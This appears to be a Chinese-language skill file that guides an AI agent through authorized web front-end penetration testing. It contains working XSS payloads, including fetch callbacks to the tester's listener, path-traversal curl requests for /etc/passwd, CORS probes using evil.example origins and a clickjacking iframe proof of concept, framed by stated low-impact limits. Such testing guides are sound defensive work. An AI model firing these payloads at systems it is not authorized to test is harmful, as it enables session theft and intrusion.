---
name: web-security-audit
description: Web 页面与前端安全测试。XSS（反射/存储/DOM/mXSS）、CSRF、CORS、响应头、Cookie、文件上传、路径遍历、sourcemap、JS bundle 静态扫描、前端路由绕过、Clickjacking。支持 Playwright 动态验证。当任务目标是"打 Web 页面 / 前端 / DOM"时启用。
---
---
name: web-security-audit
description: Web 前端安全测试。XSS、CSRF、CORS、响应头、上传、路径遍历、JS 分析、sourcemap、路由绕过、Clickjacking。
---

# web-security-audit — Web 前端安全测试

**边界**：低影响、受控验证。**不做**破坏性操作、不上传持久化木马、不批量修改数据。
**依赖**：pentest-recon 输出的攻击面清单；curl、python3、Playwright（可选）。
**目标**：真实可复现的漏洞证据，不允许"疑似 XSS"直接标 confirmed。

---

## 覆盖清单（OWASP WSTG/ASVS）

| 检查域 | WSTG | 严重度上限 |
|---|---|---|
| 响应头（HSTS/CSP/XFO/CTO/Referrer/PP） | WSTG-CFG | medium |
| Cookie 属性（Secure/HttpOnly/SameSite） | WSTG-ATH | medium |
| CORS 配置 | WSTG-CORS | medium-high |
| CSRF | WSTG-CFG-06 | medium |
| XSS 反射 / 存储 / DOM / mXSS | WSTG-INP | high-critical |
| SQLi / 命令注入 / SSTI / LFI | WSTG-INP | high-critical |
| SSRF | WSTG-ERR-05 | high-critical |
| 文件上传 | WSTG-PTH | high |
| 路径遍历 | WSTG-PTH | medium-high |
| Clickjacking | WSTG-CFG-09 | medium |
| 前端路由绕过 | WSTG-ATH | medium |
| Sourcemap / 敏感 meta / robots | WSTG-INFO | low-medium |
| 会话固定、CSRF token 复用 | WSTG-ATH | medium |

---

## Phase 0 — 前置

```bash
# 目标已授权 & 攻击面已建（pentest-recon 完成）
test -f plan/attack_surface.md || { echo "缺 attack_surface.md，先跑 pentest-recon"; exit 1; }
# Token 有效性
curl -sk -H @auth/headers_user.txt "$BASE/api/me" -o /dev/null -w "%{http_code}\n"
```

---

## Phase 1 — 响应头与 Cookie 审计（5 分钟必做）

```bash
HEADERS=$(curl -skI "$BASE/")
for h in Strict-Transport-Security Content-Security-Policy X-Content-Type-Options X-Frame-Options Referrer-Policy Permissions-Policy; do
  echo "$HEADERS" | grep -qi "$h" && echo "OK  $h" || echo "MISS $h"
done
# Cookie
curl -skI "$BASE/login" | grep -i set-cookie
```

**判定**：
- 缺 `CSP` → 直接降低 XSS 攻击成本（记录，配合 XSS 命中升级严重度）。
- 缺 `X-Frame-Options` 或 `CSP frame-ancestors` → Clickjacking。
- Cookie 无 `HttpOnly` → XSS 可偷 cookie（若 token 存 localStorage，也受影响）。
- Cookie 无 `Secure` → 走 HTTP 明文外泄。
- Cookie 无 `SameSite` 且无 CSRF Token → CSRF 更容易成立。

**PoC**：把 `curl` 完整响应头贴进 evidence。

---

## Phase 2 — CORS 审计

```bash
for o in "https://evil.example" "https://$HOST.evil.com" "https://example.com" "http://" "null" "https://"$HOST; do
  echo "=== Origin: $o ==="
  curl -sk -H "Origin: $o" -o /dev/null -D - "$BASE/api/" | grep -i "access-control"
done
```

**判定**：
- 任意 Origin 反射 `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true` → **严重 CORS 配置错误**（等同 XSS）。
- 允许子域 `https://$HOST.evil.com` 通过 → 子域枚举/接管类风险。
- 允许通配符 `*` 但无 `Allow-Credentials` → 一般 low。
- 严格白名单 + 无 `Allow-Credentials` → OK。

PoC：把响应头存 `evidence/http/cors_{origin}.txt`。

---

## Phase 3 — CSRF 审计

```bash
# 找写操作
grep -oE '/api/[^"]*' plan/attack_surface.md | sort -u > recon/write_candidates.txt
# 抽样 3-5 个 POST/DELETE 接口
for ep in $(head -5 recon/write_candidates.txt); do
  echo "=== $ep ==="
  curl -sk -X POST -H "Origin: https://evil.example" -H "Content-Type: application/x-www-form-urlencoded" -d "foo=1" -H @auth/headers_user.txt -o /dev/null -w "%{http_code}\n" "$BASE$ep"
done
```

**判定**：
- 未校验 `Origin`/`Referer`/`CSRF Token`/自定义头 → 若 Content-Type 可被跨站表单构造（`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`）→ CSRF 可成立。
- JSON Content-Type 浏览器强制 preflight → 跨站 POST 需 CORS 允许，一般不可行。

PoC：写一个 `poc/crosssite.html`（表单 + fetch），保存完整文件到 `poc/`。

---

## Phase 4 — XSS 反射型

### 4.1 找注入点

从 `plan/attack_surface.md`、`recon/api_merged.txt` 提取所有 GET 参数、query、path 参数、header 反射点。

### 4.2 Payload 矩阵（按上下文分）

| 上下文 | Payload |
|---|---|
| HTML body | `<img src=x onerror=alert(document.cookie)>` |
| HTML attr | `" onfocus=alert(1) autofocus>` |
| JS 字符串单引号 | `' - alert(1) - '` |
| JS 字符串双引号 | `" - alert(1) - "` |
| URL href | `javascript:alert(1)` |
| 反引号模板串 | `` ` - alert(1) - ` `` |
| 模板变量 | `{{7*7}}`（SSTI 顺带） |

### 4.3 验证流程（**必须走 curl → 检查响应**）

```bash
# 例：URL 参数 x 回显在 body
P="$BASE/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
curl -sk "$P" -o evidence/http/xss_reflect_1.html
grep -F '<img src=x onerror=alert(1)>' evidence/http/xss_reflect_1.html && echo "REFLECTED UNESCAPED"
grep -F '&lt;img src=x' evidence/http/xss_reflect_1.html && echo "HTML-ESCAPED"
```

**判定**：
- payload 未转义且位置可执行（在 `<body>`、事件属性、`<script>` 内）→ 反射型 XSS confirmed。
- payload 被 HTML 转义为 `&lt;` → 该点无 XSS，继续下一个。
- payload 未转义但在属性内且属性有严格引号保护 → 记 suspected。

### 4.4 提升影响（可执行才升级 high+）

无 CSP + 反射 XSS → 可注入 `fetch(...)` 外带 → 严重度 high+。
有 CSP `script-src 'self'` → 反射 XSS 严重度 medium 以下。

PoC：起本地 HTTP server（`python3 -m http.server`）做回连验证。

```bash
python3 -c "
from http.server import BaseHTTPRequestHandler,HTTPServer
class H(BaseHTTPRequestHandler):
  def do_GET(s): print('HIT',s.path); s.send_response(200); s.end_headers()
HTTPServer(('0.0.0.0',8088),H).serve_forever()
" &
# payload: <img src=x onerror=\"fetch('http://<本机IP>:8088/hit')\">
```

有回连 → 落地 critical（尤其在无 CSP 环境偷 localStorage token）。

---

## Phase 5 — XSS 存储型

**思路**：找一个可提交的用户可控字段，注入 payload，触发回显。

1. 提交：POST 带 payload 到可写接口（备注、简介、评论、地址等）。
2. 回显：GET 到列表页/详情页，检查响应 HTML。
3. 若回显 HTML 标签未转义 → 存储型 XSS。

**低影响原则**：
- 使用无害 payload（`<b>POC_MARKER_$(date +%s)</b>` 用于标记），验证转义规则后，再用最小 `<img src=x onerror=...>` 验证执行。
- **不**上传持久化脚本、不写恶意数据到别人账户、不留攻击痕迹。
- 若写入他人账户的字段（如评论），提交 1 条后即删除或停止。

**PoC 证据**：注入请求 + 回显响应 + 浏览器截图 / console 日志。

---

## Phase 6 — DOM-XSS 静态扫描

抓所有 JS bundle（`api-recon` 已下载），用 Python 做模式扫描：

```python
# scripts/js_xss_scan.py（内联示例）
import re, os, sys, json
PATTERNS = {
  'innerHTML': r'(\.innerHTML\s*=|insertAdjacentHTML\s*\(\s*[\"'\''"])[^;]{0,120}',
  'documentWrite': r'document\.write\s*\([^)]{0,200}',
  'locationSink': r'(location\.(hash|search|href|pathname)\s*\+|\.(location|URLSearchParams|URL\()?)\s*[;)]{0,5}',
  'dangerouslySetInnerHTML': r'dangerouslySetInnerHTML',
  'evalFn': r'\beval\s*\(|new\s+Function\s*\(',
  'postMessageNoOrigin': r'postMessage\s*\([^)]*\)\s*[;]?\s*(?!.*\.origin)',
}
sinks = {}
for f in os.listdir('recon/js'):
  if not f.endswith('.js'): continue
  src = open(f'recon/js/{f}', encoding='utf-8', errors='ignore').read()
  for name, pat in PATTERNS.items():
    for m in re.finditer(pat, src):
      sinks.setdefault(f, {}).setdefault(name, []).append(m.group(0)[:200])
print(json.dumps(sinks, ensure_ascii=False, indent=2))
```

**判定**：
- 单一 sink 命中不等于 DOM-XSS；需要 **source（`location.*`/`postMessage`/`URLSearchParams`）→ sink 可达**。
- 对每个候选：找 source 到 sink 的调用链；用 Playwright 触发（见 Phase 6.2）。

### 6.2 Playwright 动态验证

```javascript
// poc/dom_xss_trigger.js（用 playwright 跑）
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  page.on('console', m => console.log('CONSOLE', m.text()));
  page.on('pageerror', e => console.log('PAGEERR', e.message));
  page.on('request', r => console.log('REQ', r.url()));
  // 用无害 payload 触达
  await page.goto('https://<target>/path#<svg/onload=fetch%28\"http%3A%2F%2F<本机IP>%3A8088%2Fhit%29>');
  await page.waitForTimeout(3000);
  await browser.close();
})();
```

有回连 → DOM-XSS confirmed。

---

## Phase 7 — 文件上传与路径遍历

### 7.1 上传（低影响）

```bash
# 找一个上传端点，用最小 .txt 测试类型过滤
echo 'POC' > poc/upload.txt
curl -sk -F "file=@poc/upload.txt" -H @auth/headers_user.txt -o evidence/http/upload.txt -w "%{http_code}\n" "$BASE/api/upload"
# 检查响应 URL，尝试 GET，验证返回 Content-Type
```

**判定**：
- 允许 `.html/.htm/.svg/.phtml/.jsp` → 潜在 RCE/XSS（记 medium，需进一步验证执行环境）。
- 返回路径可预测 → 路径遍历风险（继续 Phase 7.2）。

### 7.2 路径遍历

```bash
# 找一个文件下载/预览接口，测试 ../ 
curl -sk "$BASE/api/file?path=../../../../etc/passwd" -o evidence/http/pt.txt -w "%{http_code}\n"
curl -sk "$BASE/api/file?name=..%2f..%2f..%2fetc%2fpasswd" -o evidence/http/pt2.txt -w "%{http_code}\n"
curl -sk "$BASE/api/file?name=..%5c..%5c..%5cWindows%5cwin.ini" -o evidence/http/pt3.txt -w "%{http_code}\n"
```

**判定**：响应内容包含 `root:` 或已知系统文件内容 → 路径遍历 confirmed。
**禁止**：`/etc/shadow`、系统敏感文件下载尝试；只读 `/etc/passwd` 或 `/etc/hosts` 用于验证。

---

## Phase 8 — 前端路由绕过

已知 SPA 常见路由：`/admin`、`/manage`、`/api/v1/admin/*`、`/business-developer-site-selection`（示例）。

```bash
for p in /admin /admin/index /manage /user /profile /settings /api/v1/admin /graphql /debug /console; do
  echo "=== $p ==="
  curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$p"
done
```

**SPA 特点**：路由守卫在客户端；服务端仍返回 index.html → 需要检查：
- 前端 route guard 是否依赖本地 role 变量 → 可被 localStorage 注入欺骗。
- 后端 API 是否独立鉴权（应独立）→ 前端绕过不代表后端越权。

**关键判据**：只有 API 层真的越权了才算漏洞；仅前端页面能显示不算。

---

## Phase 9 — Clickjacking

```bash
# 验证无 XFO / frame-ancestors
curl -skI "$BASE/business-page" | grep -iE 'x-frame-options|content-security-policy'
```

PoC：生成 `poc/clickjacking.html`：

```html
<!doctype html>
<iframe src="https://<target>/sensitive-page" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01"></iframe>
<button style="position:absolute;top:200px;left:300px;background:red;color:white;padding:20px;font-size:24px">点我确认</button>
```

**判定**：目标页可被 iframe 嵌入（无 XFO/frame-ancestors）+ 存在敏感操作按钮（登录、转账、删除、修改权限）→ Clickjacking confirmed。

---

## Phase 10 — Sourcemap / Meta / robots

```bash
# sourcemap
curl -sk "$BASE/static/js/main.hash.js.map" -o evidence/http/main.js.map -w "%{http_code} %{size_download}\n"
# meta generator
grep -iE '<meta name="generator"|<meta name="author"|<link rel="preconnect"' evidence/http/root.html
# robots
curl -sk "$BASE/robots.txt"
```

**判定**：
- sourcemap 200 → 源码泄露 low/medium。
- robots 泄露 `/admin`、`/swagger` 等 → 信息项（配合后续 API 发现升级）。

---

## 完成标准

- [ ] 响应头 / Cookie 审计完成
- [ ] CORS 至少 5 个 Origin 抽样
- [ ] XSS 反射：至少覆盖所有 GET 参数入口
- [ ] XSS 存储：至少测 1 个可写字段（若存在）
- [ ] DOM-XSS：JS 静态扫描完成 + 关键 sink 用 Playwright 验证
- [ ] 上传 / 路径遍历各测 1 次
- [ ] 前端路由至少覆盖 5 个 admin/manage 路径
- [ ] Clickjacking PoC HTML 已生成
- [ ] 每条命中即 `report_finding`

## 报告约定

每条 finding 报告必须包含：
- 具体 URL / 参数
- 完整请求（curl 命令可复制执行）
- 响应关键片段（脱敏）
- 是否有 CSP 缓解
- 浏览器验证截图或 console 日志
- 修复建议：输入验证 + 输出编码 + CSP + WAF 规则
